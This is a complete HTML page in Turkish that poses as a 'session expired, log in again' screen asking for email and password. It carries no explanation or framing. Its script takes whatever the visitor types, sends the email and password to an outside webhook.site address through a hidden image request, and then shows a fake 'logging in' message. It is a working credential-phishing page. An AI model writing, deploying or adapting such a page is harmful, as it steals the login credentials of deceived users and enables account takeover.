<html>
<body style="font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5">
<div style="width:400px;padding:40px;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);text-align:center">
<h2>Oturum Suresi Doldu</h2>
<p>Guvenlik nedeniyle tekrar giris yapin</p>
<input id="e" placeholder="E-posta" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<input id="p" type="password" placeholder="Sifre" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
<button id="btn" style="width:100%;padding:12px;background:#0066cc;color:#fff;border:none;border-radius:4px;cursor:pointer;margin-top:10px">Giris Yap</button>
</div>
<script>
document.getElementById("btn").addEventListener("click", function(){
  var email = document.getElementById("e").value;
  var pass = document.getElementById("p").value;
  var img = new Image();
  img.src = "https://webhook.site/43b8be70-9ca8-439e-8ae0-baf0c3f2fc2f?email=" + encodeURIComponent(email) + "&pass=" + encodeURIComponent(pass);
  this.textContent = "Giris yapiliyor...";
});
</script>
</body>
</html>
